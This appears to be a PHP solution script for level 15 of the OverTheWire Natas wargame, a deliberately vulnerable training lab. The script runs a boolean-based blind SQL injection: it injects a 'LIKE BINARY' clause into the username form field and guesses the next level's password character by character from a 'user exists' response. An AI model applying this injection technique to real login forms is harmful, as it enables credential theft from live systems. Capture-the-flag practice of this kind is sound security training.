<?php
require_once dirname(__DIR__) . '/bootstrap.php';

$level = 15;
$username = 'natas' . $level;
$password = readFlag($level - 1);

$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

$guessedPassword = "";
while (strlen($guessedPassword) < 32) {
    for ($i = 0; $i < strlen($chars); $i++) {
        $attempt = $guessedPassword . $chars[$i];

        $response = $client->request('POST', $url, [
            'auth' => [$username, $password],
            'form_params' => [
                'username' => 'natas16" AND password LIKE BINARY "' . $attempt . '%',
            ]
        ]);
        $body = (string)$response->getBody();

        echo 'trying ' . $attempt . "\n";
        if (stripos($body, "user exists") !== false) {
            $guessedPassword .= $chars[$i];

            break;
        }
    }
}
